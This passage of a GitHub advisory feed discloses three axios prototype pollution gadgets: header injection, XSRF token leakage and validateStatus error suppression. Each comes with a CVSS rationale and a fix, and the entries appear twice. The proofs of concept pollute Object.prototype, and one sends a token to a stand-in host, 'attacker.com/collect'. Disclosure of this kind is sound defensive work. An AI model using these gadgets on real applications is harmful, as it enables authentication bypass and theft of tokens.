// Legitimate application code
const response = await axios.post('https://internal-api.company.com/admin/delete', 
    { userId: 42 },
    { headers: { 'Authorization': 'Bearer VALID_USER_TOKEN' } }
);
</code></pre>
<h3 id="impact">Impact</h3>
<ul>
<li>Authentication Bypass (CVSS: C:H)</li>
<li>Session Fixation (CVSS: I:H)</li>
<li>Privilege Escalation (CVSS: C:H, I:H)</li>
<li>IP Spoofing / WAF Bypass (CVSS: I:H)</li>
</ul>
<p><strong>Note on Scope</strong>: There is an argument to promote this from <strong>S:U to S:C</strong> (Scope: Changed), which would raise the score to <strong>10.0</strong>. In some architectures, Axios is commonly used for service to service communication where downstream services trust identity headers (<code>Authorization</code>, <code>X-Role</code>, <code>X-User-ID</code>, <code>X-Tenant-ID</code>) forwarded from upstream API gateways. In this scenario, the vulnerable component (Axios in Service A) and the impacted component (Service B, which acts on the injected identity) are under different security authorities. The injected headers cross a trust boundary, meaning the impact extends beyond the security scope of the vulnerable component, the CVSS v3.1 definition of a Scope Change. We conservatively score S:U here, but maintainers should evaluate which one applies better here.</p>
<h3 id="recommended-fix">Recommended Fix</h3>
<p>Add an explicit own-property check in <code>lib/adapters/http.js</code>:</p>
<pre><code class="language-diff">- } else if (utils.isFormData(data) &amp;&amp; utils.isFunction(data.getHeaders)) {
-     headers.set(data.getHeaders());
+ } else if (utils.isFormData(data) &amp;&amp; utils.isFunction(data.getHeaders) &amp;&amp;
+            Object.prototype.hasOwnProperty.call(data, 'getHeaders')) {
+     headers.set(data.getHeaders());
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/axios/axios/security/advisories/GHSA-6chq-wfr3-2hj9">https://github.com/axios/axios/security/advisories/GHSA-6chq-wfr3-2hj9</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-42035">https://nvd.nist.gov/vuln/detail/CVE-2026-42035</a></li>
<li><a href="https://github.com/advisories/GHSA-6chq-wfr3-2hj9">https://github.com/advisories/GHSA-6chq-wfr3-2hj9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6chq-wfr3-2hj9</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-05T00:25:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[axios] Axios: Header Injection via Prototype Pollution]]></title>
        <id>https://github.com/advisories/GHSA-6chq-wfr3-2hj9</id>
        <link href="https://github.com/advisories/GHSA-6chq-wfr3-2hj9"/>
        <updated>2026-05-05T00:25:48.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A prototype pollution gadget exists in the Axios HTTP adapter (lib/adapters/http.js) that allows an attacker to inject arbitrary HTTP headers into outgoing requests. The vulnerability exploits duck-type checking of the data payload, where if Object.prototype is polluted with getHeaders, append, pipe, on, once, and Symbol.toStringTag, Axios misidentifies any plain object payload as a FormData instance and calls the attacker-controlled getHeaders() function, merging the returned headers into the outgoing request.</p>
<p>The vulnerable code resides exclusively in lib/adapters/http.js. The prototype pollution source does not need to originate from Axios itself — any prototype pollution primitive in any dependency in the application's dependency tree is sufficient to trigger this gadget.</p>
<p>Prerequisites:</p>
<p>A prototype pollution primitive must exist somewhere in the application's dependency chain (e.g., via lodash.merge, qs, JSON5, or any deep-merge utility processing attacker-controlled input). The pollution source is not required to be in Axios.
The application must use Axios to make HTTP requests with a data payload (POST, PUT, PATCH).</p>
<h3 id="details">Details</h3>
<p>The vulnerability is in <code>lib/adapters/http.js</code>, in the data serialization pipeline:</p>
<pre><code class="language-javascript">// lib/adapters/http.js 
} else if (utils.isFormData(data) &amp;&amp; utils.isFunction(data.getHeaders)) {
    headers.set(data.getHeaders());
    // ...
}
</code></pre>
<p>Axios uses two sequential duck-type checks, both of which can be satisfied via prototype pollution:</p>
<p><strong>1. <code>utils.isFormData(data)</code> — <code>lib/utils.js</code></strong></p>
<pre><code class="language-javascript">const isFormData = (thing) =&gt; {
  let kind;
  return thing &amp;&amp; (
    (typeof FormData === 'function' &amp;&amp; thing instanceof FormData) || (
      isFunction(thing.append) &amp;&amp; ( 
        (kind = kindOf(thing)) === 'formdata' ||  
        (kind === 'object' &amp;&amp; isFunction(thing.toString) &amp;&amp; thing.toString() === '[object FormData]')
      )
    )
  )
}
</code></pre>
<p><strong>2. <code>utils.isFunction(data.getHeaders)</code> — Duck-type for <code>form-data</code> npm package</strong></p>
<pre><code class="language-javascript">// Returns true if Object.prototype.getHeaders is a function
utils.isFunction(data.getHeaders) 
</code></pre>
<h3 id="poc">PoC</h3>
<pre><code class="language-javascript">// Simulate Prototype Pollution
Object.prototype[Symbol.toStringTag] = 'FormData';
Object.prototype.append = () =&gt; {};
Object.prototype.getHeaders = () =&gt; {
    const headers = Object.create(null);
    (.... Introduce here all the headers you want ....)
    return headers;
};
Object.prototype.pipe = function(d) { if(d&amp;&amp;d.end)d.end(); return d; };
Object.prototype.on = function() { return this; };
Object.prototype.once = function() { return this; };

// Legitimate application code
const response = await axios.post('https://internal-api.company.com/admin/delete', 
    { userId: 42 },
    { headers: { 'Authorization': 'Bearer VALID_USER_TOKEN' } }
);
</code></pre>
<h3 id="impact">Impact</h3>
<ul>
<li>Authentication Bypass (CVSS: C:H)</li>
<li>Session Fixation (CVSS: I:H)</li>
<li>Privilege Escalation (CVSS: C:H, I:H)</li>
<li>IP Spoofing / WAF Bypass (CVSS: I:H)</li>
</ul>
<p><strong>Note on Scope</strong>: There is an argument to promote this from <strong>S:U to S:C</strong> (Scope: Changed), which would raise the score to <strong>10.0</strong>. In some architectures, Axios is commonly used for service to service communication where downstream services trust identity headers (<code>Authorization</code>, <code>X-Role</code>, <code>X-User-ID</code>, <code>X-Tenant-ID</code>) forwarded from upstream API gateways. In this scenario, the vulnerable component (Axios in Service A) and the impacted component (Service B, which acts on the injected identity) are under different security authorities. The injected headers cross a trust boundary, meaning the impact extends beyond the security scope of the vulnerable component, the CVSS v3.1 definition of a Scope Change. We conservatively score S:U here, but maintainers should evaluate which one applies better here.</p>
<h3 id="recommended-fix">Recommended Fix</h3>
<p>Add an explicit own-property check in <code>lib/adapters/http.js</code>:</p>
<pre><code class="language-diff">- } else if (utils.isFormData(data) &amp;&amp; utils.isFunction(data.getHeaders)) {
-     headers.set(data.getHeaders());
+ } else if (utils.isFormData(data) &amp;&amp; utils.isFunction(data.getHeaders) &amp;&amp;
+            Object.prototype.hasOwnProperty.call(data, 'getHeaders')) {
+     headers.set(data.getHeaders());
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/axios/axios/security/advisories/GHSA-6chq-wfr3-2hj9">https://github.com/axios/axios/security/advisories/GHSA-6chq-wfr3-2hj9</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-42035">https://nvd.nist.gov/vuln/detail/CVE-2026-42035</a></li>
<li><a href="https://github.com/advisories/GHSA-6chq-wfr3-2hj9">https://github.com/advisories/GHSA-6chq-wfr3-2hj9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6chq-wfr3-2hj9</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-05T00:25:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[axios] Axios: XSRF Token Cross-Origin Leakage via Prototype Pollution Gadget in `withXSRFToken` Boolean Coercion]]></title>
        <id>https://github.com/advisories/GHSA-xx6v-rp6x-q39c</id>
        <link href="https://github.com/advisories/GHSA-xx6v-rp6x-q39c"/>
        <updated>2026-05-05T00:25:23.000Z</updated>
        <content type="html"><![CDATA[<h1 id="vulnerability-disclosure-xsrf-token-cross-origin-leakage-via-prototype-pollution-gadget-in-withxsrftoken-boolean-coercion">Vulnerability Disclosure: XSRF Token Cross-Origin Leakage via Prototype Pollution Gadget in <code>withXSRFToken</code> Boolean Coercion</h1>
<h2 id="summary">Summary</h2>
<p>The Axios library's XSRF token protection logic uses JavaScript truthy/falsy semantics instead of strict boolean comparison for the <code>withXSRFToken</code> config property. When this property is set to any truthy non-boolean value (via prototype pollution or misconfiguration), the same-origin check (<code>isURLSameOrigin</code>) is <strong>short-circuited</strong>, causing XSRF tokens to be sent to <strong>all</strong> request targets including cross-origin servers controlled by an attacker.</p>
<p><strong>Severity:</strong> Medium (CVSS 5.4)
<strong>Affected Versions:</strong> All versions since <code>withXSRFToken</code> was introduced
<strong>Vulnerable Component:</strong> <code>lib/helpers/resolveConfig.js:59</code>
<strong>Environment:</strong> Browser-only (XSRF logic only runs when <code>hasStandardBrowserEnv</code> is true)</p>
<h2 id="cwe">CWE</h2>
<ul>
<li><strong>CWE-201:</strong> Insertion of Sensitive Information Into Sent Data</li>
<li><strong>CWE-183:</strong> Permissive List of Allowed Inputs</li>
</ul>
<h2 id="cvss-31">CVSS 3.1</h2>
<p><strong>Score: 5.4 (Medium)</strong></p>
<p>Vector: <code>CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N</code></p>
<table>
<thead>
<tr>
<th>Metric</th>
<th>Value</th>
<th>Justification</th>
</tr>
</thead>
<tbody><tr>
<td>Attack Vector</td>
<td>Network</td>
<td>PP triggered remotely via vulnerable dependency</td>
</tr>
<tr>
<td>Attack Complexity</td>
<td>Low</td>
<td>Once PP exists, single property assignment. Consistent with GHSA-fvcv-3m26-pcqx</td>
</tr>
<tr>
<td>Privileges Required</td>
<td>None</td>
<td>No authentication needed</td>
</tr>
<tr>
<td>User Interaction</td>
<td>Required</td>
<td>Victim must use browser with axios making cross-origin requests</td>
</tr>
<tr>
<td>Scope</td>
<td>Unchanged</td>
<td>Token leakage within browser context</td>
</tr>
<tr>
<td>Confidentiality</td>
<td>Low</td>
<td>XSRF token leaked — anti-CSRF token, not session token</td>
</tr>
<tr>
<td>Integrity</td>
<td>Low</td>
<td>Stolen XSRF token enables CSRF attacks (bypass CSRF protection only)</td>
</tr>
<tr>
<td>Availability</td>
<td>None</td>
<td>No availability impact</td>
</tr>
</tbody></table>
<h2 id="usage-of-helper-vulnerabilities">Usage of "Helper" Vulnerabilities</h2>
<p>This vulnerability requires <strong>Zero Direct User Input</strong> when triggered via prototype pollution.</p>
<p>If an attacker can pollute <code>Object.prototype.withXSRFToken</code> with any truthy value (e.g., <code>1</code>, <code>"true"</code>, <code>{}</code>), Axios will automatically inherit this value during config merge. The truthy value short-circuits the same-origin check, causing the XSRF cookie value to be sent as a request header to every destination.</p>
<h2 id="vulnerable-code">Vulnerable Code</h2>
<p><strong>File:</strong> <code>lib/helpers/resolveConfig.js</code>, lines 57-66</p>
<pre><code class="language-javascript">// Line 57: Function check — only applies if withXSRFToken is a function
withXSRFToken &amp;&amp; utils.isFunction(withXSRFToken) &amp;&amp; (withXSRFToken = withXSRFToken(newConfig));

// Line 59: The vulnerable condition
if (withXSRFToken || (withXSRFToken !== false &amp;&amp; isURLSameOrigin(newConfig.url))) {
//  ^^^^^^^^^^^^^^^^
//  When withXSRFToken = 1 (truthy non-boolean): this is true → short-circuits
//  isURLSameOrigin() is NEVER called → token sent to ANY origin
  const xsrfValue = xsrfHeaderName &amp;&amp; xsrfCookieName &amp;&amp; cookies.read(xsrfCookieName);
  if (xsrfValue) {
    headers.set(xsrfHeaderName, xsrfValue);
  }
}
</code></pre>
<p><strong>Designed behavior:</strong></p>
<ul>
<li><code>true</code> → always send token (explicit cross-origin opt-in)</li>
<li><code>false</code> → never send token</li>
<li><code>undefined</code> → send only for same-origin requests</li>
</ul>
<p><strong>Actual behavior for non-boolean truthy values (<code>1</code>, <code>"false"</code>, <code>{}</code>, <code>[]</code>):</strong></p>
<ul>
<li>All treated as truthy → same-origin check skipped → token sent everywhere</li>
</ul>
<h2 id="proof-of-concept">Proof of Concept</h2>
<pre><code class="language-javascript">// Simulated prototype pollution from any vulnerable dependency
Object.prototype.withXSRFToken = 1;

// In browser with document.cookie = "XSRF-TOKEN=secret-csrf-token-abc123"
// Every axios request now includes: X-XSRF-TOKEN: secret-csrf-token-abc123
// Even to cross-origin hosts:
await axios.get('https://attacker.com/collect');
// → attacker receives the XSRF token in request headers
</code></pre>
<h2 id="verified-poc-output">Verified PoC Output</h2>
<pre><code>withXSRFToken Value        Sends Token Cross-Origin  Expected
true (boolean)             YES                       Yes (opt-in)
false (boolean)            No                        No
undefined (default)        No                        No
1 (number)                 YES ← BUG                No
"false" (string)           YES ← BUG                No
{} (object)                YES ← BUG                No
[] (array)                 YES ← BUG                No

Prototype pollution:
  Object.prototype.withXSRFToken = 1
  config.withXSRFToken = 1 → leaks=true
  isURLSameOrigin() was NOT called (short-circuited)
</code></pre>
<h2 id="impact-analysis">Impact Analysis</h2>
<ul>
<li><strong>XSRF Token Theft:</strong> Anti-CSRF token sent as header to attacker-controlled server, enabling CSRF attacks against the victim application</li>
<li><strong>Universal Scope:</strong> A single <code>Object.prototype.withXSRFToken = 1</code> affects every axios request in the application</li>
<li><strong>Misconfiguration Risk:</strong> Developer writing <code>withXSRFToken: "false"</code> (string) instead of <code>false</code> (boolean) triggers the same issue without PP</li>
</ul>
<p><strong>Limitations:</strong></p>
<ul>
<li>Browser-only (XSRF logic runs only in <code>hasStandardBrowserEnv</code>)</li>
<li>XSRF tokens are anti-CSRF tokens, not session tokens — leakage enables CSRF but not direct session hijacking</li>
<li>Attacker still needs a way to deliver the forged request after obtaining the token</li>
</ul>
<h2 id="recommended-fix">Recommended Fix</h2>
<p>Use strict boolean comparison:</p>
<pre><code class="language-javascript">// FIXED: lib/helpers/resolveConfig.js
const shouldSendXSRF = withXSRFToken === true ||
  (withXSRFToken == null &amp;&amp; isURLSameOrigin(newConfig.url));

if (shouldSendXSRF) {
  const xsrfValue = xsrfHeaderName &amp;&amp; xsrfCookieName &amp;&amp; cookies.read(xsrfCookieName);
  if (xsrfValue) {
    headers.set(xsrfHeaderName, xsrfValue);
  }
}
</code></pre>
<h2 id="resources">Resources</h2>
<ul>
<li><a href="https://cwe.mitre.org/data/definitions/201.html">CWE-201: Insertion of Sensitive Information Into Sent Data</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/183.html">CWE-183: Permissive List of Allowed Inputs</a></li>
<li><a href="https://github.com/advisories/GHSA-fvcv-3m26-pcqx">GHSA-fvcv-3m26-pcqx: Related PP Gadget in Axios</a></li>
<li><a href="https://github.com/axios/axios">Axios GitHub Repository</a></li>
</ul>
<h2 id="timeline">Timeline</h2>
<table>
<thead>
<tr>
<th>Date</th>
<th>Event</th>
</tr>
</thead>
<tbody><tr>
<td>2026-04-15</td>
<td>Vulnerability discovered during source code audit</td>
</tr>
<tr>
<td>2026-04-16</td>
<td>Report revised: corrected CVSS, documented limitations</td>
</tr>
<tr>
<td>TBD</td>
<td>Report submitted to vendor via GitHub Security Advisory</td>
</tr>
</tbody></table>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/axios/axios/security/advisories/GHSA-xx6v-rp6x-q39c">https://github.com/axios/axios/security/advisories/GHSA-xx6v-rp6x-q39c</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-42042">https://nvd.nist.gov/vuln/detail/CVE-2026-42042</a></li>
<li><a href="https://github.com/advisories/GHSA-xx6v-rp6x-q39c">https://github.com/advisories/GHSA-xx6v-rp6x-q39c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xx6v-rp6x-q39c</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-05T00:25:22.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[axios] Axios: XSRF Token Cross-Origin Leakage via Prototype Pollution Gadget in `withXSRFToken` Boolean Coercion]]></title>
        <id>https://github.com/advisories/GHSA-xx6v-rp6x-q39c</id>
        <link href="https://github.com/advisories/GHSA-xx6v-rp6x-q39c"/>
        <updated>2026-05-05T00:25:23.000Z</updated>
        <content type="html"><![CDATA[<h1 id="vulnerability-disclosure-xsrf-token-cross-origin-leakage-via-prototype-pollution-gadget-in-withxsrftoken-boolean-coercion">Vulnerability Disclosure: XSRF Token Cross-Origin Leakage via Prototype Pollution Gadget in <code>withXSRFToken</code> Boolean Coercion</h1>
<h2 id="summary">Summary</h2>
<p>The Axios library's XSRF token protection logic uses JavaScript truthy/falsy semantics instead of strict boolean comparison for the <code>withXSRFToken</code> config property. When this property is set to any truthy non-boolean value (via prototype pollution or misconfiguration), the same-origin check (<code>isURLSameOrigin</code>) is <strong>short-circuited</strong>, causing XSRF tokens to be sent to <strong>all</strong> request targets including cross-origin servers controlled by an attacker.</p>
<p><strong>Severity:</strong> Medium (CVSS 5.4)
<strong>Affected Versions:</strong> All versions since <code>withXSRFToken</code> was introduced
<strong>Vulnerable Component:</strong> <code>lib/helpers/resolveConfig.js:59</code>
<strong>Environment:</strong> Browser-only (XSRF logic only runs when <code>hasStandardBrowserEnv</code> is true)</p>
<h2 id="cwe">CWE</h2>
<ul>
<li><strong>CWE-201:</strong> Insertion of Sensitive Information Into Sent Data</li>
<li><strong>CWE-183:</strong> Permissive List of Allowed Inputs</li>
</ul>
<h2 id="cvss-31">CVSS 3.1</h2>
<p><strong>Score: 5.4 (Medium)</strong></p>
<p>Vector: <code>CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N</code></p>
<table>
<thead>
<tr>
<th>Metric</th>
<th>Value</th>
<th>Justification</th>
</tr>
</thead>
<tbody><tr>
<td>Attack Vector</td>
<td>Network</td>
<td>PP triggered remotely via vulnerable dependency</td>
</tr>
<tr>
<td>Attack Complexity</td>
<td>Low</td>
<td>Once PP exists, single property assignment. Consistent with GHSA-fvcv-3m26-pcqx</td>
</tr>
<tr>
<td>Privileges Required</td>
<td>None</td>
<td>No authentication needed</td>
</tr>
<tr>
<td>User Interaction</td>
<td>Required</td>
<td>Victim must use browser with axios making cross-origin requests</td>
</tr>
<tr>
<td>Scope</td>
<td>Unchanged</td>
<td>Token leakage within browser context</td>
</tr>
<tr>
<td>Confidentiality</td>
<td>Low</td>
<td>XSRF token leaked — anti-CSRF token, not session token</td>
</tr>
<tr>
<td>Integrity</td>
<td>Low</td>
<td>Stolen XSRF token enables CSRF attacks (bypass CSRF protection only)</td>
</tr>
<tr>
<td>Availability</td>
<td>None</td>
<td>No availability impact</td>
</tr>
</tbody></table>
<h2 id="usage-of-helper-vulnerabilities">Usage of "Helper" Vulnerabilities</h2>
<p>This vulnerability requires <strong>Zero Direct User Input</strong> when triggered via prototype pollution.</p>
<p>If an attacker can pollute <code>Object.prototype.withXSRFToken</code> with any truthy value (e.g., <code>1</code>, <code>"true"</code>, <code>{}</code>), Axios will automatically inherit this value during config merge. The truthy value short-circuits the same-origin check, causing the XSRF cookie value to be sent as a request header to every destination.</p>
<h2 id="vulnerable-code">Vulnerable Code</h2>
<p><strong>File:</strong> <code>lib/helpers/resolveConfig.js</code>, lines 57-66</p>
<pre><code class="language-javascript">// Line 57: Function check — only applies if withXSRFToken is a function
withXSRFToken &amp;&amp; utils.isFunction(withXSRFToken) &amp;&amp; (withXSRFToken = withXSRFToken(newConfig));

// Line 59: The vulnerable condition
if (withXSRFToken || (withXSRFToken !== false &amp;&amp; isURLSameOrigin(newConfig.url))) {
//  ^^^^^^^^^^^^^^^^
//  When withXSRFToken = 1 (truthy non-boolean): this is true → short-circuits
//  isURLSameOrigin() is NEVER called → token sent to ANY origin
  const xsrfValue = xsrfHeaderName &amp;&amp; xsrfCookieName &amp;&amp; cookies.read(xsrfCookieName);
  if (xsrfValue) {
    headers.set(xsrfHeaderName, xsrfValue);
  }
}
</code></pre>
<p><strong>Designed behavior:</strong></p>
<ul>
<li><code>true</code> → always send token (explicit cross-origin opt-in)</li>
<li><code>false</code> → never send token</li>
<li><code>undefined</code> → send only for same-origin requests</li>
</ul>
<p><strong>Actual behavior for non-boolean truthy values (<code>1</code>, <code>"false"</code>, <code>{}</code>, <code>[]</code>):</strong></p>
<ul>
<li>All treated as truthy → same-origin check skipped → token sent everywhere</li>
</ul>
<h2 id="proof-of-concept">Proof of Concept</h2>
<pre><code class="language-javascript">// Simulated prototype pollution from any vulnerable dependency
Object.prototype.withXSRFToken = 1;

// In browser with document.cookie = "XSRF-TOKEN=secret-csrf-token-abc123"
// Every axios request now includes: X-XSRF-TOKEN: secret-csrf-token-abc123
// Even to cross-origin hosts:
await axios.get('https://attacker.com/collect');
// → attacker receives the XSRF token in request headers
</code></pre>
<h2 id="verified-poc-output">Verified PoC Output</h2>
<pre><code>withXSRFToken Value        Sends Token Cross-Origin  Expected
true (boolean)             YES                       Yes (opt-in)
false (boolean)            No                        No
undefined (default)        No                        No
1 (number)                 YES ← BUG                No
"false" (string)           YES ← BUG                No
{} (object)                YES ← BUG                No
[] (array)                 YES ← BUG                No

Prototype pollution:
  Object.prototype.withXSRFToken = 1
  config.withXSRFToken = 1 → leaks=true
  isURLSameOrigin() was NOT called (short-circuited)
</code></pre>
<h2 id="impact-analysis">Impact Analysis</h2>
<ul>
<li><strong>XSRF Token Theft:</strong> Anti-CSRF token sent as header to attacker-controlled server, enabling CSRF attacks against the victim application</li>
<li><strong>Universal Scope:</strong> A single <code>Object.prototype.withXSRFToken = 1</code> affects every axios request in the application</li>
<li><strong>Misconfiguration Risk:</strong> Developer writing <code>withXSRFToken: "false"</code> (string) instead of <code>false</code> (boolean) triggers the same issue without PP</li>
</ul>
<p><strong>Limitations:</strong></p>
<ul>
<li>Browser-only (XSRF logic runs only in <code>hasStandardBrowserEnv</code>)</li>
<li>XSRF tokens are anti-CSRF tokens, not session tokens — leakage enables CSRF but not direct session hijacking</li>
<li>Attacker still needs a way to deliver the forged request after obtaining the token</li>
</ul>
<h2 id="recommended-fix">Recommended Fix</h2>
<p>Use strict boolean comparison:</p>
<pre><code class="language-javascript">// FIXED: lib/helpers/resolveConfig.js
const shouldSendXSRF = withXSRFToken === true ||
  (withXSRFToken == null &amp;&amp; isURLSameOrigin(newConfig.url));

if (shouldSendXSRF) {
  const xsrfValue = xsrfHeaderName &amp;&amp; xsrfCookieName &amp;&amp; cookies.read(xsrfCookieName);
  if (xsrfValue) {
    headers.set(xsrfHeaderName, xsrfValue);
  }
}
</code></pre>
<h2 id="resources">Resources</h2>
<ul>
<li><a href="https://cwe.mitre.org/data/definitions/201.html">CWE-201: Insertion of Sensitive Information Into Sent Data</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/183.html">CWE-183: Permissive List of Allowed Inputs</a></li>
<li><a href="https://github.com/advisories/GHSA-fvcv-3m26-pcqx">GHSA-fvcv-3m26-pcqx: Related PP Gadget in Axios</a></li>
<li><a href="https://github.com/axios/axios">Axios GitHub Repository</a></li>
</ul>
<h2 id="timeline">Timeline</h2>
<table>
<thead>
<tr>
<th>Date</th>
<th>Event</th>
</tr>
</thead>
<tbody><tr>
<td>2026-04-15</td>
<td>Vulnerability discovered during source code audit</td>
</tr>
<tr>
<td>2026-04-16</td>
<td>Report revised: corrected CVSS, documented limitations</td>
</tr>
<tr>
<td>TBD</td>
<td>Report submitted to vendor via GitHub Security Advisory</td>
</tr>
</tbody></table>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/axios/axios/security/advisories/GHSA-xx6v-rp6x-q39c">https://github.com/axios/axios/security/advisories/GHSA-xx6v-rp6x-q39c</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-42042">https://nvd.nist.gov/vuln/detail/CVE-2026-42042</a></li>
<li><a href="https://github.com/advisories/GHSA-xx6v-rp6x-q39c">https://github.com/advisories/GHSA-xx6v-rp6x-q39c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xx6v-rp6x-q39c</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-05T00:25:22.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[axios] Axios: Authentication Bypass via Prototype Pollution Gadget in `validateStatus` Merge Strategy]]></title>
        <id>https://github.com/advisories/GHSA-w9j2-pvgh-6h63</id>
        <link href="https://github.com/advisories/GHSA-w9j2-pvgh-6h63"/>
        <updated>2026-05-05T00:21:40.000Z</updated>
        <content type="html"><![CDATA[<h1 id="vulnerability-disclosure-authentication-bypass-via-prototype-pollution-gadget-in-validatestatus-merge-strategy">Vulnerability Disclosure: Authentication Bypass via Prototype Pollution Gadget in <code>validateStatus</code> Merge Strategy</h1>
<h2 id="summary">Summary</h2>
<p>The Axios library is vulnerable to a Prototype Pollution "Gadget" attack that allows any <code>Object.prototype</code> pollution to <strong>silently suppress all HTTP error responses</strong> (401, 403, 500, etc.), causing them to be treated as successful responses. This completely bypasses application-level authentication and error handling.</p>
<p>The root cause is that <code>validateStatus</code> is the <strong>only</strong> config property using the <code>mergeDirectKeys</code> merge strategy, which uses JavaScript's <code>in</code> operator — an operator that inherently traverses the prototype chain. When <code>Object.prototype.validateStatus</code> is polluted with <code>() =&gt; true</code>, all HTTP status codes are accepted as success.</p>
<p><strong>Severity:</strong> High (CVSS 8.2)
<strong>Affected Versions:</strong> All versions (v0.x - v1.x including v1.15.0)
<strong>Vulnerable Component:</strong> <code>lib/core/mergeConfig.js</code> (<code>mergeDirectKeys</code> strategy) + <code>lib/core/settle.js</code></p>
<h2 id="cwe">CWE</h2>
<ul>
<li><strong>CWE-1321:</strong> Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution')</li>
<li><strong>CWE-287:</strong> Improper Authentication</li>
</ul>
<h2 id="cvss-31">CVSS 3.1</h2>
<p><strong>Score: 8.2 (High)</strong></p>
<p>Vector: <code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:N</code></p>
<table>
<thead>
<tr>
<th>Metric</th>
<th>Value</th>
<th>Justification</th>
</tr>
</thead>
<tbody><tr>
<td>Attack Vector</td>
<td>Network</td>
<td>PP is triggered remotely</td>
</tr>
<tr>
<td>Attack Complexity</td>
<td>Low</td>
<td>Once PP exists, a single property assignment exploits this. Consistent with GHSA-fvcv-3m26-pcqx</td>
</tr>
<tr>
<td>Privileges Required</td>
<td>None</td>
<td>No authentication needed</td>
</tr>
<tr>
<td>User Interaction</td>
<td>None</td>
<td>No user interaction required</td>
</tr>
<tr>
<td>Scope</td>
<td>Unchanged</td>
<td>Impact within the application</td>
</tr>
<tr>
<td>Confidentiality</td>
<td>Low</td>
<td>401 treated as success may expose data behind auth gates</td>
</tr>
<tr>
<td>Integrity</td>
<td>High</td>
<td>All error handling and auth checks are silently bypassed — application operates on invalid assumptions</td>
</tr>
<tr>
<td>Availability</td>
<td>None</td>
<td>The function works correctly (returns true), no crash</td>
</tr>
</tbody></table>
<h2 id="usage-of-helper-vulnerabilities">Usage of "Helper" Vulnerabilities</h2>
<p>This vulnerability requires <strong>Zero Direct User Input</strong>.</p>
<p>If an attacker can pollute <code>Object.prototype</code> via any other library in the stack, Axios will automatically inherit the polluted <code>validateStatus</code> function during config merge. The <code>in</code> operator in <code>mergeDirectKeys</code> makes this property <strong>uniquely susceptible</strong> to prototype pollution compared to all other config properties.</p>
<h2 id="why-validatestatus-is-uniquely-vulnerable">Why <code>validateStatus</code> Is Uniquely Vulnerable</h2>
<p>All other config properties use <code>defaultToConfig2</code>, which reads <code>config2[prop]</code> (traverses prototype). But <code>validateStatus</code> uses <code>mergeDirectKeys</code>, which uses the <code>in</code> operator:</p>
<pre><code class="language-javascript">// mergeConfig.js:58-64 — mergeDirectKeys (ONLY used by validateStatus)
function mergeDirectKeys(a, b, prop) {
  if (prop in config2) {           // ← `in` traverses prototype chain!
    return getMergedValue(a, b);
  } else if (prop in config1) {
    return getMergedValue(undefined, a);
  }
}

// mergeConfig.js:94
const mergeMap = {
  // ... all others use defaultToConfig2 ...
  validateStatus: mergeDirectKeys,   // ← ONLY property using this strategy
};
</code></pre>
<p>The <code>in</code> operator is a <strong>more aggressive</strong> prototype traversal than property access. While <code>config2['validateStatus']</code> also traverses the prototype, the explicit <code>in</code> check makes the intent clearer and the vulnerability more direct.</p>
<h2 id="proof-of-concept">Proof of Concept</h2>
<h3 id="1-the-setup-simulated-pollution">1. The Setup (Simulated Pollution)</h3>
<pre><code class="language-javascript">Object.prototype.validateStatus = () =&gt; true;
</code></pre>
<h3 id="2-the-gadget-trigger-safe-code">2. The Gadget Trigger (Safe Code)</h3>
<pre><code class="language-javascript">// Application checks authentication via HTTP status codes
try {
  const response = await axios.get('https://api.internal/admin/users');
  // Developer expects: 401 → catch block → redirect to login
  // Reality: 401 → treated as success → displays admin data
  processAdminData(response.data);  // Executes with 401 response body!
} catch (error) {
  redirectToLogin();  // NEVER REACHED for 401/403/500
}
</code></pre>
<h3 id="3-the-execution">3. The Execution</h3>
<pre><code class="language-javascript">// mergeConfig.js:58 — 'validateStatus' in config2
// config2 = { url: '/admin/users', method: 'get' }
// 'validateStatus' in config2 → checks prototype → finds () =&gt; true → TRUE
// → getMergedValue(defaultValidator, () =&gt; true) → returns () =&gt; true

// settle.js:16 — ALL status codes resolve
const validateStatus = response.config.validateStatus;  // () =&gt; true
if (!response.status || !validateStatus || validateStatus(response.status)) {
  resolve(response);  // 401, 403, 500 all resolve here!
}
</code></pre>
<h3 id="4-the-impact">4. The Impact</h3>
<pre><code>Before pollution:
  HTTP 200 → resolve (success)
  HTTP 401 → reject (auth error) → redirectToLogin()
  HTTP 403 → reject (forbidden) → showAccessDenied()
  HTTP 500 → reject (server error) → showErrorPage()

After pollution:
  HTTP 200 → resolve (success)
  HTTP 401 → resolve (SUCCESS!) → processAdminData() with error body
  HTTP 403 → resolve (SUCCESS!) → application thinks user has access
